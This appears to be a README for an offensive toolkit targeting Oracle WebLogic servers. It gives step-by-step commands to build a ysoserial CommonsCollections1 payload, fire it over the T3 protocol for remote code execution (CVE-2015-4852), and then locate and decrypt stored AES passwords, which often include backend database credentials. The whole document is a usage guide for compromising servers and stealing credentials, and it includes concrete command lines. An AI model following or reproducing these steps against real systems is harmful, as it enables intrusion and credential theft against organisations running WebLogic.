Usage:
 -Find a vulnerable WebLogic server with T3 enabled. Currently, only instances serving a root index page seem to be working.
 -run: java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '<command to be executed on target>' > payload.out
 -Find the payload size by running: python webLogPayload.py 64.64.64.64 8.8.8.8 payload.out
 -Edit the third and second byte of the 'payload' variable in webIllogical.py to match the length you just found
 -run: python webIllogical.py <target_ip> <target_port> payload.out
 -Once a reliable channel has been established, find 'setWLSEnv.sh" and source the file
 -Grep around for '[AES]' to find decryptable passwords
 -run: java weblogic.WLST decryptPassword.py <local_domain_path> <AES_string>
    -Be sure to remove any '\' characters from the AES string


TODO:
 -Automate finding the length and altering the payload to match. Need to check protocol specs...

 ::webLogPayload.py
   -Usage: python webLogPayload.py payload.out

   Returns a hex string representation of the length of the payload to be sent to the target WebLogic server by webIllogical.py script


 ::webIllogical.py
   -Usage: python webIllogical.py <target_ip> <target_port> payload.out

   Takes advantage of the T3 protocal used by WebLogic to exploit an Apache CommonsCollections vulnerability (CVE-2015-4852) that allows for RCE. Currently only working
   against targets that serve a root index page.
   Versions 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 are affected.

 ::decryptPassword.py
   -Usage: java weblogic.WLST decryptPassword.py <domain_local_path> <AES_string>

   Implements native WebLogic tools to take advantage of the fact that passwords are being stored with symetric encryption instead of being hashed. Decrypts passwords stored
   by WebLogic which often include creds to the backend databases.
